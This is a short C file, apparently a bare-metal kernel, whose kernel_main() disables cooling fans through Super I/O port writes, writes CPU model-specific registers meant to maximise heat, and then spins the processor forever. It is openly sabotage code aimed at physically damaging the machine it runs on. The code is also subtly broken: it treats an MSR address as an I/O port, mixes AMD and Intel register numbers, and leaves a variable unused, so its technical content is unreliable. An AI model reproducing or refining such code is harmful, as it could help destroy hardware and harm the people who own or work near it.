#include <stdint.h>

#define FAN_CONTROL_PORT 0x4E
#define CPU_MSR_PORT 0xC0010064
#define THERMAL_SENSOR_PORT 0x19C

void disable_fans() {
    outb(0x87, 0x2E);
    outb(0x87, 0x2E);
    
    outb(0x04, FAN_CONTROL_PORT);
    outb(0x00, FAN_CONTROL_PORT + 1);
    
    outb(0x05, FAN_CONTROL_PORT);
    outb(0x00, FAN_CONTROL_PORT + 1);
    
    outb(0x06, FAN_CONTROL_PORT);
    outb(0x00, FAN_CONTROL_PORT + 1);
    
    outb(0x07, FAN_CONTROL_PORT);
    outb(0x00, FAN_CONTROL_PORT + 1);
}

void maximize_cpu_heat() {
    uint64_t msr_value = 0;
    wrmsr(CPU_MSR_PORT, 0x0);
    wrmsr(0x199, 0xFF);
    wrmsr(0xE2, 0x0);
    wrmsr(0x1B0, 0x40000);
}

void stress_cpu() {
    while(1) {
        asm volatile(
            "nop\n\t"
            "nop\n\t"
            "nop\n\t"
            "nop\n\t"
            ::: "memory"
        );
    }
}

void kernel_main() {
    init_hardware();
    disable_fans();
    maximize_cpu_heat();
    stress_cpu();
}
